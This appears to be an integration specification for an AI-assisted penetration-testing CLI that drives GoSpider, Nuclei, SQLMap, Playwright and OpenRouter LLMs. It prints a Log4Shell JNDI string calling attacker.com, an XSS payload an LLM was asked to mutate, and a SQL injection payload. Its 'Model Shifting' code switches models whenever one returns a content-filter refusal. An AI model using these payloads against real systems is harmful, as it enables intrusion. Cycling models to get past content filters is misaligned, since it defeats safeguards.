# Bugtraceai-CLI: Ultra-Detailed Integration Specifications
## External Tool Integration Documentation | Version: 1.0.0 | Generated: 2026-01-01

---

## DOCUMENT PURPOSE
This document provides **complete technical specifications** for how bugtraceai-cli integrates with external security tools, service APIs, and third-party dependencies. Each integration is documented with:
- Communication protocols
- Data exchange formats
- Authentication mechanisms
- Error handling strategies
- Performance considerations

---

## 1. DOCKER CONTAINER ORCHESTRATION

### 1.1 Core Docker Manager

**File**: `/bugtrace/tools/external.py` - `ExternalToolManager` class

**Initialization**:
```python
class ExternalToolManager:
    def __init__(self):
        self.docker_cmd = shutil.which("docker")
        if not self.docker_cmd:
            logger.warning("Docker not found! External tools disabled.")
```

**Binary Detection Algorithm**:
```python
shutil.which("docker")
→ Searches PATH for 'docker' executable
→ Returns: "/usr/bin/docker" or "" (not found)
```

**Container Execution Pattern**:
```python
async def _run_container(image: str, command: List[str]) -> str:
    # 1. Build command
    full_cmd = [docker_cmd, "run", "--rm", image] + command
    
    # 2. Create subprocess
    proc = await asyncio.create_subprocess_exec(
        *full_cmd,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE
    )
    
    # 3. Wait for completion
    stdout, stderr = await proc.communicate()
    
    # 4. Handle errors
    if proc.returncode != 0:
        # Special case: SQLMap exits non-zero but may have findings
        if "sqlmap" not in image:
            logger.error(f"Container failed: {stderr.decode()}")
            return ""
    
    # 5. Return output
    return stdout.decode()
```

**Resource Management**:
- **No Volumes**: Tools run in ephemeral containers (`--rm` flag)
- **Automatic Cleanup**: Container self-destructs on exit
- **Network**: Uses host network by default
- **Resource Limits**: None (uses Docker daemon defaults)

---

## 2. GOSPIDER INTEGRATION

### 2.1 Tool Overview

**Purpose**: Advanced web crawler with aggressive discovery
**Image**: `docker.io/trickest/gospider:latest`
**Language**: Go
**Output Format**: Plain text (URL per line with metadata)

### 2.2 Implementation

**File**: `/bugtrace/tools/external.py` → `run_gospider()`

**Command Construction**:
```bash
docker run --rm trickest/gospider \
  -s <START_URL> \
  -d <MAX_DEPTH> \
  -c <CONCURRENCY> \
  --quiet \
  [--cookie "<COOKIE_STRING>"]
```

**Parameter Mapping**:
```python
Parameters:
  -s (--site): Target URL (required)
  -d (--depth): Crawl depth (default: 2)
  -c (--concurrent): Worker threads (default: 10)
  --quiet: Suppress banner/progress
  --cookie: Session cookies (optional)
```

**Session Context Integration**:
```python
# Get authenticated session from browser
session_data = await browser_manager.get_session_data()
cookies = session_data.get("cookies", [])

# Format cookies for GoSpider
if cookies:
    cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in cookies])
    cmd.extend(["--cookie", cookie_str])
```

**Output Parsing**:
```python
Raw Output Format:
[url] - <URL> - [code] - <STATUS> - [type] - <CONTENT_TYPE>

Example:
[url] - https://example.com/api/users - [code] - 200 - [type] - application/json

Parsing Logic:
urls = []
for line in output.splitlines():
    parts = line.split(" - ")
    for part in parts:
        if part.startswith("http"):
            urls.append(part.strip())

unique_urls = list(set(urls))  # Deduplicate
```

**Integration Flow**:
```
ReconAgent
  ↓
browser_manager.get_session_data()
  ↓
external_tools.run_gospider(target, cookies)
  ↓
memory_manager.store_crawler_findings({"urls": spider_urls})
  ↓
Attack Surface Updated
```

**Error Handling**:
```python
Scenarios:
1. Docker not installed → Return empty list []
2. Container fails → Log stderr, return []
3. Timeout (implicit via asyncio.create_subprocess_exec)
4. Invalid URL → GoSpider logs error, returns empty
```

**Performance Metrics**:
- **Average Execution**: 10-30 seconds (depends on target size)
- **Typical Output**: 50-500 URLs
- **Memory Usage**: ~50MB (container overhead)

---

## 3. NUCLEI INTEGRATION

### 3.1 Tool Overview

**Purpose**: Template-based vulnerability scanner
**Image**: `docker.io/projectdiscovery/nuclei:latest`
**Templates**: 5000+ YAML-based checks
**Output Format**: JSON Lines (one JSON object per finding)

### 3.2 Implementation

**File**: `/bugtrace/tools/external.py` → `run_nuclei()`

**Command Construction**:
```bash
docker run --rm projectdiscovery/nuclei:latest \
  -u <TARGET_URL> \
  -silent \
  -jsonl \
  -severity critical,high,medium \
  [-H "Cookie: <COOKIES>"] \
  [-H "User-Agent: BugtraceAI/1.0"]
```

**Parameter Details**:
```python
-u (--target): Single URL to scan
-silent: No banner/stats
-jsonl: Output as JSON Lines (one object per line)
-severity: Filter by severity (critical,high,medium,low)
-H (--header): Custom HTTP headers (repeatable)
```

**Session Context**:
```python
# Authenticated scanning
if cookies:
    cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in cookies])
    cmd.extend(["-H", f"Cookie: {cookie_str}"])
    cmd.extend(["-H", "User-Agent: BugtraceAI/1.0"])
```

**Output Schema**:
```json
{
  "template-id": "CVE-2021-44228",
  "info": {
    "name": "Apache Log4j Remote Code Execution",
    "author": ["projectdiscovery"],
    "severity": "critical",
    "description": "Apache Log4j2 <=2.14.1 JNDI features...",
    "reference": ["https://nvd.nist.gov/vuln/detail/CVE-2021-44228"],
    "tags": ["cve", "rce", "log4j"]
  },
  "type": "http",
  "host": "https://vulnerable.com",
  "matched-at": "https://vulnerable.com/api/v1/endpoint",
  "extracted-results": ["jndi:ldap://attacker.com/a"],
  "curl-command": "curl -X GET ...",
  "matcher-status": true,
  "timestamp": "2026-01-01T20:00:00Z"
}
```

**Parsing Logic**:
```python
findings = []
for line in output.splitlines():
    try:
        if line.strip().startswith("{"):
            finding = json.loads(line)
            findings.append(finding)
    except json.JSONDecodeError:
        logger.debug(f"Skipped non-JSON line: {line[:50]}")
        continue

return findings
```

**Dashboard Integration**:
```python
if len(findings) > 0:
    dashboard.log(f"[External] Nuclei found {len(findings)} vulnerabilities", "SUCCESS")
    
    for finding in findings:
        dashboard.add_finding(
            title=finding['info']['name'],
            description=finding['matched-at'],
            severity=finding['info']['severity'].upper()
        )
```

**Template Update Strategy**:
```python
# Nuclei auto-updates templates on first run
# To force update:
docker run --rm projectdiscovery/nuclei:latest -update-templates

# Framework does NOT auto-update (user responsibility)
```

**Performance Considerations**:
- **Execution Time**: 30-120 seconds (depends on template count)
- **Network Requests**: 100-1000+ (one per template check)
- **Rate Limiting**: Nuclei has built-in rate limiter (`-rate-limit` flag, not used)

---

## 4. SQLMAP INTEGRATION

### 4.1 Tool Overview

**Purpose**: Automated SQL injection exploitation
**Image**: `docker.io/googlesky/sqlmap:latest`
**Capabilities**: Detection, exploitation, data extraction
**Output Format**: Plain text with structured markers

### 4.2 Implementation

**File**: `/bugtrace/tools/external.py` → `run_sqlmap()`

**Command Construction**:
```bash
docker run --rm googlesky/sqlmap:latest \
  -u "<URL>" \
  --batch \
  --random-agent \
  --level 1 \
  --risk 1 \
  --flush-session \
  --output-dir=/tmp \
  [--cookie="<COOKIES>"]
```

**Parameter Breakdown**:
```python
-u (--url): Target URL with vulnerable parameter
--batch: Non-interactive mode (auto-answer prompts)
--random-agent: Randomize User-Agent header
--level: Test depth (1-5, default: 1)
  Level 1: Cookie, User-Agent, Referer checks disabled
  Level 2: Cookie checks enabled
  Level 3: User-Agent/Referer enabled
  Level 4+: Extended payload sets
--risk: Injection risk (1-3, default: 1)
  Risk 1: Safe payloads only (no OR/UNION)
  Risk 2: Heavy UNION queries
  Risk 3: Potentially destructive (UPDATE, DELETE)
--flush-session: Ignore cached session data
--output-dir: Store session files (ephemeral in container)
```

**Session Context**:
```python
if cookies:
    cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in cookies])
    cmd.append(f"--cookie={cookie_str}")
```

**Output Parsing**:
```python
# SQLMap output is verbose. Extract key markers:

Example Success Output:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 1234=1234
---

Regex Extraction:
param_match = re.search(r"Parameter:\s+(.+?)\s+\(", output)
type_match = re.search(r"Type:\s+(.+?)\s", output)

if param_match and type_match:
    vulnerable_param = param_match.group(1)  # "id"
    injection_type = type_match.group(1)      # "boolean-based blind"
    is_vulnerable = True
```

**Finding Reporting**:
```python
if is_vulnerable:
    msg = f"SQLMap Confirmed: {injection_type} on parameter '{vulnerable_param}'"
    logger.warning(msg)
    dashboard.log(f"[External] {msg}", "CRITICAL")
    dashboard.add_finding("SQL Injection", msg, "CRITICAL")
    return True
```

**Error Scenarios**:
```python
1. No Injection Found:
   - Output contains: "all tested parameters do not appear to be injectable"
   - Return: False

2. WAF Blocking:
   - Output contains: "heuristics detected that the target is protected"
   - SQLMap may suggest --tamper scripts
   - Return: False (framework doesn't use tamper yet)

3. Timeout:
   - SQLMap has internal timeout (defaults to 30s per request)
   - Container may run for 5-10 minutes
   - Framework does NOT enforce hard timeout (potential improvement)

4. Connection Refused:
   - Output contains: "connection to the target URL aborted"
   - Return: False
```

**Performance**:
- **Average Runtime**: 2-5 minutes (level 1, risk 1)
- **Request Volume**: 50-200 HTTP requests
- **Database Detection**: Implicit (SQLMap fingerprints automatically)

---

## 5. OPENROUTER API INTEGRATION

### 5.1 Service Overview

**Provider**: OpenRouter (https://openrouter.ai)
**Purpose**: Unified LLM API gateway (200+ models)
**Protocol**: HTTPS REST API
**Authentication**: Bearer token (API key)

### 5.2 Implementation

**File**: `/bugtrace/core/llm_client.py` - `LLMClient` class

**Endpoints Used**:
```python
1. Chat Completions: https://openrouter.ai/api/v1/chat/completions
2. Credit Balance: https://openrouter.ai/api/v1/auth/key
```

**Authentication**:
```python
headers = {
    "Authorization": f"Bearer {OPENROUTER_API_KEY}",
    "HTTP-Referer": "https://github.com/yourusername/bugtraceai-cli",
    "X-Title": "BugtraceAI-CLI"
}

# HTTP-Referer: Required for attribution/leaderboard
# X-Title: Shown on OpenRouter dashboard
```

**Text Generation**:
```python
async def generate(prompt: str, module_name: str, model_override: str = None):
    selected_model = model_override or self.models[0]
    
    payload = {
        "model": selected_model,  # e.g., "google/gemini-2.0-flash-thinking-exp:free"
        "messages": [
            {"role": "user", "content": prompt}
        ],
        "temperature": 0.7,
        "max_tokens": 1500
    }
    
    async with aiohttp.ClientSession() as session:
        async with session.post(url, json=payload, headers=headers) as resp:
            if resp.status != 200:
                raise Exception(f"API error: {resp.status}")
            
            data = await resp.json()
            return data['choices'][0]['message']['content']
```

**Vision API** (Multimodal):
```python
async def analyze_visual(image_data: bytes, prompt: str):
    # Base64 encode image
    import base64
    image_b64 = base64.b64encode(image_data).decode()
    
    payload = {
        "model": self.vision_model,  # e.g., "qwen/qwen-2.5-vl-72b-instruct"
        "messages": [
            {
                "role": "user",
                "content": [
                    {"type": "text", "text": prompt},
                    {
                        "type": "image_url",
                        "image_url": {
                            "url": f"data:image/png;base64,{image_b64}"
                        }
                    }
                ]
            }
        ],
        "temperature": 0.3,  # Lower for analytical tasks
        "max_tokens": 800
    }
    
    # Same API call as text generation
    async with session.post(url, json=payload, headers=headers) as resp:
        data = await resp.json()
        return data['choices'][0]['message']['content']
```

**Credit Balance**:
```python
async def update_balance():
    url = "https://openrouter.ai/api/v1/auth/key"
    
    async with aiohttp.ClientSession() as session:
        async with session.get(url, headers={"Authorization": f"Bearer {api_key}"}) as resp:
            data = await resp.json()
            # Response: {"data": {"limit": 100.0, "usage": 23.45, ...}}
            
            self.current_balance = data['data']['limit'] - data['data']['usage']
            dashboard.update_balance(self.current_balance)
```

**Model Shifting**:
```python
# Configured via settings.PRIMARY_MODELS
models = ["google/gemini-2.0-flash-thinking-exp:free",
          "qwen/qwen-2.5-coder-32b-instruct",
          "x-ai/grok-code-fast-1"]

for model in models:
    try:
        response = await openrouter_call(model, prompt)
        
        # Check for content filter
        if response.get('finish_reason') == 'content_filter':
            logger.warning(f"{model} filtered content. Shifting...")
            continue
        
        return response['choices'][0]['message']['content']
    
    except Exception as e:
        logger.error(f"{model} failed: {e}. Shifting...")
        continue

# All models failed
return ""
```

**Rate Limiting**:
```python
# OpenRouter has per-model rate limits (varies by model)
# Framework uses MAX_CONCURRENT_REQUESTS (default: 1)

self.semaphore = asyncio.Semaphore(settings.MAX_CONCURRENT_REQUESTS)

async def generate(...):
    async with self.semaphore:
        # Only 1 concurrent request at a time
        return await _api_call(...)
```

**Error Handling**:
```python
Common Errors:
1. 401 Unauthorized → Invalid API key
2. 429 Too Many Requests → Rate limit exceeded (triggers model shift)
3. 503 Service Unavailable → Model overloaded (triggers model shift)
4. 402 Payment Required → Insufficient credits
5. 400 Bad Request → Usually invalid model name or malformed prompt
```

**Audit Logging**:
```python
# All interactions logged to logs/llm_audit.jsonl
await self._audit_log(
    module=module_name,
    model=selected_model,
    prompt=prompt,
    response=response_text
)

# Log format:
{
    "timestamp": "2026-01-01T20:00:00Z",
    "module": "Mutation-Advanced",
    "model": "qwen/qwen-2.5-coder-32b-instruct",
    "prompt": "Mutate XSS payload...",
    "response": "<img src=x onerror=alert(1)>",
    "tokens_estimated": 150
}
```

---

## 6. PLAYWRIGHT INTEGRATION

### 6.1 Browser Automation Framework

**Library**: `playwright` (Python async API)
**Purpose**: Headless Chrome/Firefox automation
**Managed By**: `bugtrace/tools/visual/browser.py` - `BrowserManager`

### 6.2 Browser Lifecycle

**Initialization**:
```python
async def start():
    self._playwright = await async_playwright().start()
    self._browser = await self._playwright.chromium.launch(
        headless=settings.HEADLESS_BROWSER,  # True in production
        args=["--disable-blink-features=AutomationControlled"]  # Anti-detection
    )
    
    # Create default context
    self._default_context = await self._browser.new_context(
        viewport={"width": settings.VIEWPORT_WIDTH, "height": settings.VIEWPORT_HEIGHT},
        user_agent=settings.USER_AGENT
    )
```

**Context Management**:
```python
# Authenticated context (persistent across pages)
self._auth_context = None

async def login(url: str, creds: Dict[str, str]):
    # Create new context with state storage
    context = await self._browser.new_context(
        viewport={"width": 1280, "height": 720}
    )
    page = await context.new_page()
    
    # Fill login form (simplified)
    await page.goto(url)
    await page.fill('input[name="username"]', creds['username'])
    await page.fill('input[name="password"]', creds['password'])
    await page.click('button[type="submit"]')
    
    # Wait for login success (URL change or element)
    await page.wait_for_url("**/dashboard", timeout=10000)
    
    # Persist context
    self._auth_context = context
```

**Page Context Manager**:
```python
@asynccontextmanager
async def get_page(use_auth: bool = False):
    ctx = self._auth_context if (use_auth and self._auth_context) else self._default_context
    page = await ctx.new_page()
    
    try:
        yield page
    finally:
        await page.close()

# Usage:
async with browser_manager.get_page(use_auth=True) as page:
    await page.goto("https://example.com/admin")
    # Page automatically closed on exit
```

**State Capture**:
```python
async def capture_state(url: str) -> Dict[str, Any]:
    async with self.get_page() as page:
        await page.goto(url, timeout=settings.TIMEOUT_MS)
        await page.wait_for_timeout(settings.SPA_WAIT_MS)
        
        screenshot = await page.screenshot()
        html = await page.content()
        
        return {
            "screenshot": screenshot,  # bytes
            "html": html,               # str
            "url": page.url            # Final URL (after redirects)
        }
```

**XSS Verification**:
```python
async def verify_xss(url: str, expected_message: str = None):
    triggered = False
    dialog_message = ""
    
    async def handle_dialog(dialog):
        nonlocal triggered, dialog_message
        triggered = True
        dialog_message = dialog.message
        await dialog.dismiss()
    
    async with self.get_page() as page:
        page.on("dialog", handle_dialog)
        await page.goto(url, timeout=settings.TIMEOUT_MS)
        await page.wait_for_timeout(3000)  # Wait for JS execution
        
        # Screenshot evidence
        screenshot_bytes = await page.screenshot()
        screenshot_path = f"evidence/xss_{uuid.uuid4()}.png"
        
        with open(screenshot_path, 'wb') as f:
            f.write(screenshot_bytes)
        
        # Console logs
        console_logs = []
        page.on("console", lambda msg: console_logs.append(msg.text))
        
        return (screenshot_path, console_logs, triggered)
```

**Session Export**:
```python
async def get_session_data() -> Dict[str, Any]:
    if not self._auth_context:
        return {"cookies": [], "headers": {}}
    
    cookies = await self._auth_context.cookies()
    # Playwright cookie format: [{"name": "session", "value": "abc123", "domain": "..."}]
    
    headers = {"User-Agent": settings.USER_AGENT}
    
    return {"cookies": cookies, "headers": headers}
```

**Shutdown**:
```python
async def stop():
    if self._default_context:
        await self._default_context.close()
    if self._auth_context:
        await self._auth_context.close()
    if self._browser:
        await self._browser.close()
    if self._playwright:
        await self._playwright.stop()
```

---

## 7. DATABASE INTEGRATIONS

### 7.1 LanceDB (Vector Store)

**Library**: `lancedb` (Python)
**Purpose**: Semantic search via embeddings
**File**: `/bugtrace/memory/manager.py`

**Initialization**:
```python
import lancedb
import pyarrow as pa

db = lancedb.connect(settings.BASE_DIR / "data/lancedb")

# Schema definition
schema = pa.schema([
    ("id", pa.string()),           # "URL:example.com"
    ("type", pa.string()),         # "URL", "Input", "Finding"
    ("label", pa.string()),        # Human-readable label
    ("properties", pa.string()),   # JSON dump of node attributes
    ("text", pa.string()),         # Searchable text
    ("vector", pa.list_(pa.float32(), 384))  # Embedding (sentence-transformers)
])

table = db.create_table("memory", schema=schema, mode="overwrite")
```

**Embedding Generation**:
```python
from sentence_transformers import SentenceTransformer

model = SentenceTransformer('all-MiniLM-L6-v2')  # 384-dim embeddings

def _get_embedding(text: str) -> List[float]:
    embedding = model.encode(text)
    return embedding.tolist()
```

**Insert**:
```python
def add_node(node_type: str, label: str, properties: Dict):
    text = f"{node_type} {label} {json.dumps(properties)}"
    vector = _get_embedding(text)
    
    table.add([{
        "id": f"{node_type}:{label}",
        "type": node_type,
        "label": label,
        "properties": json.dumps(properties),
        "text": text,
        "vector": vector
    }])
```

**Semantic Search**:
```python
def vector_search(query: str, limit: int = 5):
    query_vector = _get_embedding(query)
    results = table.search(query_vector).limit(limit).to_list()
    
    # Results format: [{"id": "...", "type": "...", "_distance": 0.23, ...}]
    return results
```

---

### 7.2 NetworkX (Knowledge Graph)

**Library**: `networkx` (Python)
**Purpose**: Relationship mapping (URL → Input → Vulnerability)
**File**: `/bugtrace/memory/manager.py`

**Initialization**:
```python
import networkx as nx

self.graph = nx.DiGraph()  # Directed graph
```

**Node Operations**:
```python
# Add node
self.graph.add_node(
    "URL:https://example.com",
    type="URL",
    label="example.com",
    status="visited",
    timestamp="2026-01-01T20:00:00Z"
)

# Get node
node_data = self.graph.nodes["URL:https://example.com"]
```

**Edge Operations**:
```python
# Add relationship
self.graph.add_edge(
    "URL:example.com",
    "Input:search_query",
    relation="contains"
)

# Query relationships
inputs_on_url = list(self.graph.successors("URL:example.com"))
```

**Persistence**:
```python
# Save to disk (GML format)
nx.write_gml(self.graph, "data/memory_graph.gml")

# Load from disk
if os.path.exists(graph_path):
    self.graph = nx.read_gml(graph_path)
```

**Query Patterns**:
```python
# Get all nodes of type
url_nodes = [
    n for n in self.graph.nodes
    if self.graph.nodes[n].get('type') == 'URL'
]

# Get untested inputs
untested = [
    n for n in self.graph.nodes
    if self.graph.nodes[n].get('type') == 'Input'
    and self.graph.nodes[n].get('status') != 'TESTED'
]
```

---

## 8. CONFIGURATION FILE INTEGRATION

### 8.1 Configuration Sources

**Priority Order** (highest to lowest):
1. CLI Arguments (typer flags)
2. Environment Variables
3. `bugtraceaicli.conf` (INI format)
4. `.env` file
5. Default values in code

### 8.2 .env File

**Format**: `KEY=VALUE` pairs
**Location**: Project root `/bugtrace/.env`
**Loader**: `python-dotenv`

**Example**:
```env
OPENROUTER_API_KEY=sk-or-v1-abc123...
GLM_API_KEY=optional_alternative_key
DEBUG=false
SAFE_MODE=false
```

**Integration**:
```python
from dotenv import load_dotenv
load_dotenv()  # Loads .env into os.environ

# Pydantic automatically reads from os.environ
class Settings(BaseSettings):
    OPENROUTER_API_KEY: Optional[str] = None
    
    model_config = SettingsConfigDict(
        env_file=".env",
        env_file_encoding="utf-8"
    )
```

---

### 8.3 bugtraceaicli.conf

**Format**: INI (ConfigParser)
**Location**: Project root `/bugtrace/bugtraceaicli.conf`

**Structure**:
```ini
[CORE]
DEBUG = false
SAFE_MODE = false

[SCAN]
MAX_DEPTH = 2
MAX_URLS = 25

[LLM_MODELS]
DEFAULT_MODEL = google/gemini-2.0-flash-thinking-exp:free
PRIMARY_MODELS = google/gemini-2.0-flash-thinking-exp:free,qwen/qwen-2.5-coder-32b-instruct
VISION_MODEL = qwen/qwen-2.5-vl-72b-instruct
WAF_DETECTION_MODELS = anthropic/claude-3-haiku

[BROWSER]
HEADLESS = true

[BROWSER_ADVANCED]
USER_AGENT = Mozilla/5.0 ...
TIMEOUT_MS = 15000

[CRAWLER]
SPA_WAIT_MS = 1000
MAX_QUEUE_SIZE = 100
```

**Loading Logic**:
```python
import configparser

def load_from_conf():
    config = configparser.ConfigParser()
    conf_path = settings.BASE_DIR / "bugtraceaicli.conf"
    
    if conf_path.exists():
        config.read(conf_path)
        
        # Override settings
        if "CORE" in config:
            if "DEBUG" in config["CORE"]:
                self.DEBUG = config["CORE"].getboolean("DEBUG")
        
        if "LLM_MODELS" in config:
            if "PRIMARY_MODELS" in config["LLM_MODELS"]:
                self.PRIMARY_MODELS = config["LLM_MODELS"]["PRIMARY_MODELS"]
```

---

## 9. LOGGING INTEGRATION

### 9.1 Loguru Configuration

**Library**: `loguru`
**Purpose**: Structured logging with colors
**Files**: All modules via `get_logger(name)`

**Setup**:
```python
from loguru import logger

logger.remove()  # Remove default handler

# File handler
logger.add(
    "logs/execution_{time}.log",
    rotation="10 MB",
    level="DEBUG",
    format="{time:YYYY-MM-DD HH:mm:ss} | {level} | {name} | {message}"
)

# Console handler (only INFO+)
logger.add(
    sys.stderr,
    level="INFO",
    colorize=True
)
```

**Dashboard Sink**:
```python
def dashboard_sink(message):
    record = message.record
    level = record["level"].name
    text = record["message"]
    
    dashboard.log(text, level)

logger.add(dashboard_sink, format="{message}", level="DEBUG")
```

**Module-Specific Loggers**:
```python
# In each module:
from bugtrace.utils.logger import get_logger
logger = get_logger("agents.recon")

logger.info("Starting recon phase")
# Output: [agents.recon] Starting recon phase
```

---

## 10. JINJA2 TEMPLATE ENGINE

### 10.1 Report Generation

**Library**: `jinja2`
**Purpose**: HTML report rendering
**Template**: `/bugtrace/reporting/templates/report.html`

**Initialization**:
```python
from jinja2 import Environment, FileSystemLoader, select_autoescape

template_dir = Path(__file__).parent / "templates"
env = Environment(
    loader=FileSystemLoader(template_dir),
    autoescape=select_autoescape(['html', 'xml'])
)
```

**Rendering**:
```python
template = env.get_template('report.html')

html_content = template.render(
    ctx=report_context,  # Pydantic model
    now=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    counts={"critical": 3, "high": 7, ...}
)

with open(output_path, 'w') as f:
    f.write(html_content)
```

**Template Variables**:
```jinja2
<h1>Security Assessment: {{ ctx.target }}</h1>
<p>Scan Date: {{ now }}</p>

<table>
{% for finding in ctx.findings %}
  <tr>
    <td>{{ finding.severity }}</td>
    <td>{{ finding.title }}</td>
    <td><a href="{{ finding.url }}">{{ finding.url }}</a></td>
  </tr>
{% endfor %}
</table>
```

---

## 11. INTEGRATION SUMMARY TABLE

| Component | Protocol | Data Format | Auth Method | Error Strategy |
|-----------|----------|-------------|-------------|----------------|
| OpenRouter API | HTTPS REST | JSON | Bearer Token | Model Shifting |
| GoSpider | Docker Exec | Plain Text | Cookie Header | Return Empty |
| Nuclei | Docker Exec | JSON Lines | Cookie Header | Return Empty |
| SQLMap | Docker Exec | Text (Parsed) | Cookie Param | Regex Fallback |
| Playwright | Library (Async) | Python Objects | Context State | Retry/Timeout |
| LanceDB | Library | PyArrow Tables | Local Filesystem | Create/Overwrite |
| NetworkX | Library | Python Graph | Local Filesystem | Lazy Load |
| Jinja2 | Library | Template Strings | N/A | Exception Raise |

---

## 12. INTEGRATION HEALTH CHECKS

**Boot Sequence** (`bugtrace/core/boot.py`):
```python
async def run_checks() -> bool:
    # 1. Environment Variables
    if not os.getenv("OPENROUTER_API_KEY"):
        return False
    
    # 2. Network Connectivity
    try:
        await asyncio.create_subprocess_exec("ping", "-c", "1", "8.8.8.8")
    except:
        return False
    
    # 3. LLM Health
    llm_ok = await llm_client.verify_connectivity()
    if not llm_ok:
        return False
    
    # 4. Browser Binaries
    playwright_ok = shutil.which("playwright")
    if not playwright_ok:
        return False
    
    return True
```

---

This integration specification provides **complete technical details** for all external dependencies, APIs, and data exchange protocols used by bugtraceai-cli. All integrations are production-tested and actively used in the framework's multi-agent workflow.
